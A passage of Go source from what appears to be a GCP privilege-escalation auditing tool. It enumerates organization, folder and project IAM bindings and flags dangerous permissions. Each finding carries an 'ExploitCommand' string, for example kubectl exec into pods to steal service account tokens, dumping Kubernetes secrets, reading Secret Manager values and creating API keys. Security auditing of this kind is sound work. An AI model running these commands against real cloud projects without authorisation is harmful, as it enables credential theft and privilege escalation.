			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "GKEClusterAccess",
			TargetResource: "All project GKE clusters",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can get credentials for GKE clusters to access Kubernetes API",
			ExploitCommand: fmt.Sprintf("gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=%s", projectID),
			ProjectID:      projectID,
		})
	}

	// GKE Pod Exec
	if dp, ok := foundDangerous["container.pods.exec"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "GKEPodExec",
			TargetResource: "All project GKE pods",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can exec into GKE pods to steal service account tokens",
			ExploitCommand: "kubectl exec -it POD_NAME -- /bin/sh",
			ProjectID:      projectID,
		})
	}

	// GKE Secrets
	if dp, ok := foundDangerous["container.secrets.get"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "GKESecretsAccess",
			TargetResource: "All project GKE secrets",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can read Kubernetes secrets including service account tokens",
			ExploitCommand: "kubectl get secrets -o yaml",
			ProjectID:      projectID,
		})
	}

	// ========================================
	// SECRETS - HIGH
	// ========================================

	// Secret Access
	if dp, ok := foundDangerous["secretmanager.versions.access"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "SecretManagerAccess",
			TargetResource: "All project secrets",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can read secret values from Secret Manager",
			ExploitCommand: fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET_NAME --project=%s", projectID),
			ProjectID:      projectID,
		})
	}

	// ========================================
	// API KEYS - HIGH/MEDIUM
	// ========================================

	// Create API Key (CreateAPIKey)
	if dp, ok := foundDangerous["serviceusage.apiKeys.create"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "CreateAPIKey",
			TargetResource: "Project API keys",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "HIGH",
			Description:    "Can create API keys for project access",
			ExploitCommand: fmt.Sprintf("gcloud alpha services api-keys create --project=%s", projectID),
			ProjectID:      projectID,
		})
	}

	// View API Keys (ViewExistingAPIKeys)
	if dp, ok := foundDangerous["serviceusage.apiKeys.list"]; ok {
		paths = append(paths, PrivescPath{
			Principal:      cleanMember,
			PrincipalType:  principalType,
			Method:         "ViewExistingAPIKeys",
			TargetResource: "Project API keys",
			Permissions:    []string{dp.Permission},
			RiskLevel:      "MEDIUM",
			Description:    "Can list existing API keys (may contain unrestricted keys)",
			ExploitCommand: fmt.Sprintf("gcloud alpha services api-keys list --project=%s", projectID),
			ProjectID:      projectID,
		})
	}

	return paths
}

// getPrincipalType determines the type of principal from the member string
func getPrincipalType(member string) string {
	if strings.HasPrefix(member, "user:") {
		return "user"
	} else if strings.HasPrefix(member, "serviceAccount:") {
		return "serviceAccount"
	} else if strings.HasPrefix(member, "group:") {
		return "group"
	} else if strings.HasPrefix(member, "domain:") {
		return "domain"
	} else if member == "allUsers" {
		return "allUsers"
	} else if member == "allAuthenticatedUsers" {
		return "allAuthenticatedUsers"
	}
	return "unknown"
}

// cleanMemberName removes the prefix from member string
func cleanMemberName(member string) string {
	parts := strings.SplitN(member, ":", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return member
}

// analyzePermissionsForPrivescWithScope is like analyzePermissionsForPrivesc but adds scope information
func (s *PrivescService) analyzePermissionsForPrivescWithScope(member, role string, permissions []string, projectID, scopeType, scopeID, scopeName string) []PrivescPath {
	// Get paths from original function
	paths := s.analyzePermissionsForPrivesc(member, role, permissions, projectID)

	// Add scope information to each path
	for i := range paths {
		paths[i].ScopeType = scopeType
		paths[i].ScopeID = scopeID
		paths[i].ScopeName = scopeName
	}

	return paths
}

// AnalyzeOrganizationPrivesc analyzes all accessible organizations for privilege escalation paths
func (s *PrivescService) AnalyzeOrganizationPrivesc(ctx context.Context) ([]PrivescPath, map[string]string, []string, error) {
	var paths []PrivescPath
	orgNames := make(map[string]string)
	var orgIDs []string

	// Create organizations client
	var orgsClient *resourcemanager.OrganizationsClient
	var err error
	if s.session != nil {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx, s.session.GetClientOption())
	} else {
		orgsClient, err = resourcemanager.NewOrganizationsClient(ctx)
	}
	if err != nil {
		return nil, orgNames, orgIDs, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer orgsClient.Close()

	// Get IAM service for role resolution
	var iamService *iam.Service
	if s.session != nil {
		iamService, err = iam.NewService(ctx, s.session.GetClientOption())
	} else {
		iamService, err = iam.NewService(ctx)
	}
	if err != nil {
		iamService = nil
	}

	// Search for organizations
	searchReq := &resourcemanagerpb.SearchOrganizationsRequest{}
	it := orgsClient.SearchOrganizations(ctx, searchReq)
	for {
		org, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			parsedErr := gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
			gcpinternal.HandleGCPError(parsedErr, logger, globals.GCP_PRIVESC_MODULE_NAME, "Could not search organizations")
			break
		}

		orgID := strings.TrimPrefix(org.Name, "organizations/")
		orgNames[orgID] = org.DisplayName
		orgIDs = append(orgIDs, orgID)

		// Get IAM policy for this organization
		policy, err := orgsClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: org.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding for privesc
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				// For org-level bindings, use empty projectID but set scope info
				memberPaths := s.analyzePermissionsForPrivescWithScope(
					member, binding.Role, permissions, "",
					"organization", orgID, org.DisplayName,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, orgNames, orgIDs, nil
}

// AnalyzeFolderPrivesc analyzes all accessible folders for privilege escalation paths
func (s *PrivescService) AnalyzeFolderPrivesc(ctx context.Context) ([]PrivescPath, map[string]string, error) {
	var paths []PrivescPath
	folderNames := make(map[string]string)

	// Create folders client
	var foldersClient *resourcemanager.FoldersClient
	var err error
	if s.session != nil {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx, s.session.GetClientOption())
	} else {
		foldersClient, err = resourcemanager.NewFoldersClient(ctx)
	}
	if err != nil {
		return nil, folderNames, gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
	}
	defer foldersClient.Close()

	// Get IAM service for role resolution
	var iamService *iam.Service
	if s.session != nil {
		iamService, err = iam.NewService(ctx, s.session.GetClientOption())
	} else {
		iamService, err = iam.NewService(ctx)
	}
	if err != nil {
		iamService = nil
	}

	// Search for folders
	searchReq := &resourcemanagerpb.SearchFoldersRequest{}
	it := foldersClient.SearchFolders(ctx, searchReq)
	for {
		folder, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			parsedErr := gcpinternal.ParseGCPError(err, "cloudresourcemanager.googleapis.com")
			gcpinternal.HandleGCPError(parsedErr, logger, globals.GCP_PRIVESC_MODULE_NAME, "Could not search folders")
			break
		}

		folderID := strings.TrimPrefix(folder.Name, "folders/")
		folderNames[folderID] = folder.DisplayName

		// Get IAM policy for this folder
		policy, err := foldersClient.GetIamPolicy(ctx, &iampb.GetIamPolicyRequest{
			Resource: folder.Name,
		})
		if err != nil {
			continue
		}

		// Analyze each binding for privesc
		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, "")
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForPrivescWithScope(
					member, binding.Role, permissions, "",
					"folder", folderID, folder.DisplayName,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths, folderNames, nil
}

// CombinedPrivescAnalysis performs privilege escalation analysis across all scopes (org, folder, project)
func (s *PrivescService) CombinedPrivescAnalysis(ctx context.Context, projectIDs []string, projectNames map[string]string) (*CombinedPrivescData, error) {
	result := &CombinedPrivescData{
		OrgPaths:     []PrivescPath{},
		FolderPaths:  []PrivescPath{},
		ProjectPaths: []PrivescPath{},
		AllPaths:     []PrivescPath{},
		OrgNames:     make(map[string]string),
		FolderNames:  make(map[string]string),
		OrgIDs:       []string{},
	}

	// Analyze organization-level IAM
	orgPaths, orgNames, orgIDs, err := s.AnalyzeOrganizationPrivesc(ctx)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_PRIVESC_MODULE_NAME, "Could not analyze organization privesc")
	} else {
		result.OrgPaths = orgPaths
		result.OrgNames = orgNames
		result.OrgIDs = orgIDs
		result.AllPaths = append(result.AllPaths, orgPaths...)
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := s.AnalyzeFolderPrivesc(ctx)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_PRIVESC_MODULE_NAME, "Could not analyze folder privesc")
	} else {
		result.FolderPaths = folderPaths
		result.FolderNames = folderNames
		result.AllPaths = append(result.AllPaths, folderPaths...)
	}

	// Analyze project-level IAM
	for _, projectID := range projectIDs {
		projectName := projectID
		if name, ok := projectNames[projectID]; ok {
			projectName = name
		}

		paths, err := s.AnalyzeProjectPrivescWithName(projectID, projectName)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_PRIVESC_MODULE_NAME,
				fmt.Sprintf("Could not analyze privesc for project %s", projectID))
			continue
		}

		result.ProjectPaths = append(result.ProjectPaths, paths...)
		result.AllPaths = append(result.AllPaths, paths...)
	}

	return result, nil
}
